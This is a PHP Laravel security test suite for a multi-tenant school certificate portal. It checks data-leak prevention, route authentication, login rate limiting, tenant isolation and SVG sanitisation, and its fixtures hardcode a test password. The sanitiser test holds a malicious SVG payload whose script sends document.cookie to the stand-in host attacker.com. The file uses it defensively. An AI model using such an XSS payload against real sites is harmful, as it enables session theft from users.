<?php

namespace Tests\Feature;

use App\Models\Ecole;
use App\Models\Utilisateur;
use App\Services\SvgSanitizerService;
use Illuminate\Foundation\Testing\TestCase;

class SecurityHardeningTest extends TestCase
{
    public function createApplication()
    {
        $app = require __DIR__ . '/../../bootstrap/app.php';
        $app->make(\Illuminate\Contracts\Console\Kernel::class)->bootstrap();
        return $app;
    }

    protected function setUp(): void
    {
        parent::setUp();
        \App\Scopes\TenantScope::setTenantId(null);
        \Illuminate\Support\Facades\Cache::flush();
    }

    protected function tearDown(): void
    {
        \App\Scopes\TenantScope::setTenantId(null);
        parent::tearDown();
    }

    /**
     * Teste que l'endpoint detectSchool ne divulgue PAS les données personnelles de l'étudiant (CNDP / RGPD).
     */
    public function test_detect_school_does_not_leak_student_personal_data(): void
    {
        $response = $this->getJson('/myportal/detect-school?query=E2026-9901');
        $response->assertStatus(200);

        $json = $response->json();
        $this->assertTrue($json['found'] ?? false);
        $this->assertEquals('student', $json['type'] ?? null);
        $this->assertArrayHasKey('ecole', $json);

        // Vérification stricte : aucune information d'identité personnelle n'est exposée à des tiers anonymes
        $this->assertArrayNotHasKey('student', $json);
        $this->assertArrayNotHasKey('nom', $json);
        $this->assertArrayNotHasKey('prenom', $json);
        $this->assertArrayNotHasKey('email', $json);
    }

    /**
     * Teste que la route /sublime est strictement protégée par authentification.
     */
    public function test_sublime_route_requires_authentication(): void
    {
        $response = $this->get('/sublime');
        $response->assertRedirect('/');
    }

    /**
     * Teste que SvgSanitizerService élimine les scripts et événements malveillants.
     */
    public function test_svg_sanitizer_removes_malicious_scripts_and_events(): void
    {
        $maliciousSvg = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/><script>fetch("https://attacker.com?leak=" + document.cookie)</script></svg>';
        $cleanSvg = SvgSanitizerService::sanitize($maliciousSvg);

        $this->assertNotFalse($cleanSvg);
        $this->assertStringNotContainsString('<script', $cleanSvg);
        $this->assertStringNotContainsString('onload', $cleanSvg);
        $this->assertStringNotContainsString('attacker.com', $cleanSvg);
        $this->assertStringContainsString('<circle', $cleanSvg);
    }

    /**
     * Teste que le rate-limiting sur le login bloque les attaques par force brute.
     */
    public function test_login_rate_limiting_blocks_brute_force(): void
    {
        for ($i = 0; $i < 6; $i++) {
            $this->post('/portal/ENS-2026/login', [
                'identifiant'  => 'fake_matricule_xyz',
                'mot_de_passe' => 'wrong_pass'
            ]);
        }

        $blockedResponse = $this->post('/portal/ENS-2026/login', [
            'identifiant'  => 'fake_matricule_xyz',
            'mot_de_passe' => 'wrong_pass'
        ]);

        $blockedResponse->assertSessionHasErrors('auth');
    }

    /**
     * Teste que la création d'une nouvelle école provisionne immédiatement les 4 modèles officiels Dompdf.
     */
    public function test_new_school_creation_provisions_all_four_official_dompdf_templates(): void
    {
        $superAdmin = Utilisateur::withoutGlobalScopes()->where('role', 'super_admin')->first();
        if (!$superAdmin) {
            $superAdmin = Utilisateur::create([
                'uuid'         => (string) \Illuminate\Support\Str::uuid(),
                'role'         => 'super_admin',
                'nom'          => 'Admin',
                'prenom'       => 'Super',
                'email'        => 'superadmin.test@example.com',
                'mot_de_passe' => \Illuminate\Support\Facades\Hash::make('Secret2026!'),
                'statut'       => 'actif',
            ]);
        }

        $codeUnique = 'TEST-EC-' . rand(1000, 9999);
        $response = $this->actingAs($superAdmin)->post('/superadmin/ecoles', [
            'nom'                       => 'Institut Supérieur de Test',
            'code_unique'               => $codeUnique,
            'email_contact'             => 'contact@' . strtolower($codeUnique) . '.ma',
            'couleur_primaire'          => '#1D4ED8',
            'admin_nom'                 => 'Directeur',
            'admin_prenom'              => 'Test',
            'admin_email'               => 'admin@' . strtolower($codeUnique) . '.ma',
            'admin_password'            => 'Secret2026!',
            'admin_password_confirmation' => 'Secret2026!',
        ]);

        $response->assertRedirect('/superadmin/ecoles');

        $ecole = Ecole::where('code_unique', $codeUnique)->first();
        $this->assertNotNull($ecole);

        $modeles = \App\Models\ModeleDocument::withoutGlobalScopes()->where('ecole_id', $ecole->id)->get();
        $this->assertCount(4, $modeles);

        $titres = $modeles->pluck('titre')->toArray();
        $this->assertContains('Certificat de Scolarité', $titres);
        $this->assertContains('Attestation de Réussite', $titres);
        $this->assertContains("Attestation d'Inscription", $titres);
        $this->assertContains('Convention & Attestation de Stage', $titres);

        foreach ($modeles as $modele) {
            $this->assertStringNotContainsString('display: flex', $modele->styles_css ?? '');
            $this->assertStringContainsString('cert-container', $modele->contenu_html);
            $this->assertStringContainsString('{qr_code}', $modele->contenu_html);
        }

        // Nettoyage de la fixture de test
        \App\Models\ModeleDocument::where('ecole_id', $ecole->id)->delete();
        Utilisateur::withoutGlobalScopes()->where('ecole_id', $ecole->id)->delete();
        $ecole->delete();
    }

    /**
     * Teste que l'anti-spam empêche un étudiant de soumettre plusieurs fois la même demande en cours.
     */
    public function test_anti_spam_prevents_duplicate_pending_demands(): void
    {
        $etudiant = Utilisateur::withoutGlobalScopes()->where('matricule', 'E2026-9901')->firstOrFail();
        $ecole = $etudiant->ecole;
        $modele = \App\Models\ModeleDocument::withoutGlobalScopes()
            ->where('ecole_id', $ecole->id)
            ->where('actif', true)
            ->firstOrFail();

        // Nettoyer toute éventuelle demande préexistante en attente
        \App\Models\DemandeDocument::where('etudiant_id', $etudiant->id)
            ->where('modele_id', $modele->id)
            ->whereIn('statut', ['en_attente', 'en_traitement'])
            ->delete();

        // 1. Première demande : acceptée
        $response1 = $this->actingAs($etudiant)->post(route('tenant.demandes.store', ['code_unique' => $ecole->code_unique]), [
            'modele_id' => $modele->id,
        ]);
        $response1->assertRedirect(route('tenant.dashboard', ['code_unique' => $ecole->code_unique]));
        $response1->assertSessionHas('success');

        // 2. Deuxième demande identique immédiate : bloquée par l'anti-spam
        $response2 = $this->actingAs($etudiant)->post(route('tenant.demandes.store', ['code_unique' => $ecole->code_unique]), [
            'modele_id' => $modele->id,
        ]);
        $response2->assertRedirect(route('tenant.dashboard', ['code_unique' => $ecole->code_unique]));
        $response2->assertSessionHasErrors('demande');

        // Nettoyage de la demande créée
        \App\Models\DemandeDocument::where('etudiant_id', $etudiant->id)
            ->where('modele_id', $modele->id)
            ->where('statut', 'en_attente')
            ->delete();
    }

    /**
     * Teste que l'upload d'un logo SVG valide est accepté (non bloqué par l'ancienne règle image).
     */
    public function test_svg_logo_upload_is_accepted_and_sanitized(): void
    {
        $admin = Utilisateur::withoutGlobalScopes()->where('role', 'admin_ecole')->where('email', 'admin@ens.ma')->firstOrFail();

        $validSvg = '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><circle cx="50" cy="50" r="40" stroke="green" stroke-width="4" fill="yellow" /></svg>';
        $svgFile = \Illuminate\Http\UploadedFile::fake()->createWithContent('logo.svg', $validSvg);

        $response = $this->actingAs($admin)->post(route('admin_ecole.parametres.logo'), [
            'logo' => $svgFile,
        ]);

        $response->assertSessionHasNoErrors();
        $response->assertSessionHas('success');
    }

    /**
     * Teste que la connexion admin est strictement cloisonnée par établissement lorsque code_unique est fourni.
     */
    public function test_school_admin_login_is_isolated_by_code_unique(): void
    {
        // Tentative de connexion avec les identifiants ENS sur le portail UIC
        $response = $this->post(route('admin_ecole.login.post'), [
            'email'        => 'admin@ens.ma',
            'mot_de_passe' => 'Secret2026!',
            'code_unique'  => 'UIC-2026',
        ]);

        $response->assertSessionHasErrors('email');
        $this->assertGuest();
    }

    /**
     * Teste que l'étudiant peut modifier son mot de passe et que le drapeau doit_changer_mot_de_passe passe à false.
     */
    public function test_student_can_update_password_and_clears_must_change_flag(): void
    {
        $ecole = Ecole::where('code_unique', 'ENS-2026')->firstOrFail();
        $etudiant = Utilisateur::withoutGlobalScopes()
            ->where('ecole_id', $ecole->id)
            ->where('role', 'etudiant')
            ->firstOrFail();

        $etudiant->update([
            'mot_de_passe'              => \Illuminate\Support\Facades\Hash::make('Secret2026!'),
            'doit_changer_mot_de_passe' => true,
        ]);

        $response = $this->actingAs($etudiant)->post("/portal/{$ecole->code_unique}/profil/mot-de-passe", [
            'mot_de_passe_actuel'               => 'Secret2026!',
            'nouveau_mot_de_passe'              => 'NouveauMdpSecurise2026#',
            'nouveau_mot_de_passe_confirmation' => 'NouveauMdpSecurise2026#',
        ]);

        $response->assertSessionHasNoErrors();
        $response->assertSessionHas('success');

        $etudiant->refresh();
        $this->assertFalse((bool) $etudiant->doit_changer_mot_de_passe);
        $this->assertTrue(\Illuminate\Support\Facades\Hash::check('NouveauMdpSecurise2026#', $etudiant->mot_de_passe));

        // Restauration de l'état initial pour l'isolation des autres tests de la suite
        $etudiant->update([
            'mot_de_passe'              => \Illuminate\Support\Facades\Hash::make('Secret2026!'),
            'doit_changer_mot_de_passe' => false,
        ]);
    }

    /**
     * Teste que l'URL /verifier/{dummy} affiche l'interface d'investigation/recherche officielle.
     */
    public function test_verification_endpoint_shows_search_interface_for_dummy_uuid(): void
    {
        $response = $this->get('/verifier/00000000-0000-0000-0000-000000000000');
        $response->assertStatus(200);
        $response->assertSee("Contrôle Officiel Anti-Fraude");
        $response->assertSee("searchUuidInput");
    }
}



